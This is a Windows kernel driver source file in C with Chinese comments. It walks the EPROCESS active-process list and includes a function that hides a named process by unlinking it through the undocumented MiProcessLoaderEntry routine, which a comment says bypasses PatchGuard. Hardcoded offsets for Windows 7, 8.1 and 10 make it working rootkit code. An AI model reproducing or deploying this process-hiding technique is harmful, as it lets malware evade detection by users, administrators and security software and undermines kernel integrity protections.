#include "EnumProcess.h"
#include "GetMiProcessLoaderEntry.h"


// 遍历进程
BOOLEAN EnumProcess()
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;
	PUCHAR pszProcessName = NULL;
	
	// 根据不同系统, 获取相应偏移大小
	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
	{
		DbgPrint("GetActiveProcessLinksOffset Error!\n");
		return FALSE;
	}

	// 获取当前进程结构对象
	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	// 开始遍历枚举进程
	do
	{
		// 从 EPROCESS 获取进程 PID
		hProcessId = PsGetProcessId(pEProcess);
		// 从 EPROCESS 获取进程名称
		pszProcessName = PsGetProcessImageFileName(pEProcess);
		// 显示
		DbgPrint("[%d]%s\n", hProcessId, pszProcessName);

		// 根据偏移计算下一个进程的 EPROCESS
		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);

	} while (pFirstEProcess != pEProcess);

	return TRUE;
}


// 隐藏指定进程(Bypass Patch Guard)
BOOLEAN HideProcess_Bypass_PatchGuard(PUCHAR pszHideProcessName)
{
	PEPROCESS pFirstEProcess = NULL, pEProcess = NULL;
	ULONG ulOffset = 0;
	HANDLE hProcessId = NULL;
	PUCHAR pszProcessName = NULL;
	typedef_MiProcessLoaderEntry pMiProcessLoaderEntry = NULL;

	// 获取 MiProcessLoaderEntry 函数地址
	pMiProcessLoaderEntry = (typedef_MiProcessLoaderEntry)GetFuncAddr_MiProcessLoaderEntry();
	if (NULL == pMiProcessLoaderEntry)
	{
		return FALSE;
	}
	DbgPrint("pMiProcessLoaderEntry[0x%p]\n", pMiProcessLoaderEntry);

	// 根据不同系统, 获取相应偏移大小
	ulOffset = GetActiveProcessLinksOffset();
	if (0 == ulOffset)
	{
		DbgPrint("GetActiveProcessLinksOffset Error!\n");
		return FALSE;
	}

	// 获取当前进程结构对象
	pFirstEProcess = PsGetCurrentProcess();
	pEProcess = pFirstEProcess;

	// 开始遍历枚举进程
	do
	{
		// 从 EPROCESS 获取进程 PID
		hProcessId = PsGetProcessId(pEProcess);
		// 从 EPROCESS 获取进程名称
		pszProcessName = PsGetProcessImageFileName(pEProcess);

		// 隐藏指定进程
		if (0 == _stricmp(pszProcessName, pszHideProcessName))
		{
			// 摘链(Bypass Patch Guard)
			pMiProcessLoaderEntry((PVOID)((PUCHAR)pEProcess + ulOffset), FALSE);   
			// 显示
			DbgPrint("[Hide Process][%d][%s]\n", hProcessId, pszProcessName);
			break;
		}

		// 根据偏移计算下一个进程的 EPROCESS
		pEProcess = (PEPROCESS)((PUCHAR)(((PLIST_ENTRY)((PUCHAR)pEProcess + ulOffset))->Flink) - ulOffset);

	} while (pFirstEProcess != pEProcess);

	return TRUE;
}



// 根据不同系统, 获取相应偏移大小
ULONG GetActiveProcessLinksOffset()
{
	ULONG ulOffset = 0;
	RTL_OSVERSIONINFOW osInfo = {0};
	NTSTATUS status = STATUS_SUCCESS;
	// 获取系统版本信息
	status = RtlGetVersion(&osInfo);
	if (!NT_SUCCESS(status))
	{
		DbgPrint("RtlGetVersion Error[0x%X]\n", status);
		return ulOffset;
	}
	// 判断系统版本
	switch (osInfo.dwMajorVersion)
	{
	case 6:
	{
		switch (osInfo.dwMinorVersion)
		{
		case 1:
		{
			// Win7
#ifdef _WIN64
			// 64 Bits
			ulOffset = 0x188;
#else
			// 32 Bits
			ulOffset = 0x0B8;
#endif
			break;
		}
		case 2:
		{
			// Win8
#ifdef _WIN64
			// 64 Bits
#else
			// 32 Bits
#endif
			break;
		}
		case 3:
		{
			// Win8.1
#ifdef _WIN64
			// 64 Bits
			ulOffset = 0x2E8;
#else
			// 32 Bits
			ulOffset = 0x0B8;
#endif
			break;
		}
		default:
			break;
		}
		break;
	}
	case 10:
	{
		// Win10
#ifdef _WIN64
		// 64 Bits
		ulOffset = 0x2F0;
#else
		// 32 Bits
		ulOffset = 0x0B8;
#endif
		break;
	}
	default:
		break;
	}

	return ulOffset;
}